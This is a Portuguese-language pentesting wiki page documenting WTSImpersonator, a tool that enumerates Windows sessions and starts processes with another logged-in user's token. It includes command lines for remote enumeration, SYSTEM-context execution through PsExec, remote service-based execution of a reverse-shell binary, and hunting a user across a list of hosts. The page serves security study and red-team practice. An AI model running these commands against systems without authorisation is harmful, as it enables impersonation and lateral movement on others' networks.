# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, por Omri Baso, usa as APIs do Windows Terminal Services expostas por meio do named pipe RPC `\\pipe\LSM_API_service` para enumerar sessões com usuários logados e iniciar um processo com o token de um usuário selecionado. Ele oferece suporte à enumeração e execução locais, bem como a workflows remotos baseados em serviços.<sup>[[1]](#references)</sup>

## Funcionalidade principal

Seu fluxo de execução local usa a seguinte sequência de APIs:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Módulos e uso

- **Enumerar usuários:** A ferramenta pode enumerar sessões no host local ou remoto.

- Localmente:
```bash
.\WTSImpersonator.exe -m enum
```
- Remotamente, especifique um endereço IP ou hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executar comandos:** Os módulos `exec` e `exec-remote` precisam de um contexto de serviço. A Microsoft documenta que `WTSQueryUserToken` exige que o chamador seja executado como `LocalSystem` com o privilégio `SE_TCB_NAME`.<sup>[[2]](#references)</sup>

- Execução de comandos local:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- O PsExec pode iniciar um prompt de comando `LocalSystem` para testes:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Execução de comandos remota:** O modo remoto cria um serviço no alvo em um workflow semelhante ao PsExec e, portanto, exige permissões para instalar e iniciar esse serviço.<sup>[[1]](#references)</sup>

- Exemplo:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User hunting:** O módulo `user-hunter` pesquisa uma lista de hosts em busca da sessão de um usuário especificado e tenta executar o programa fornecido nesse contexto.<sup>[[1]](#references)</sup>
- Exemplo de uso:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: função `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
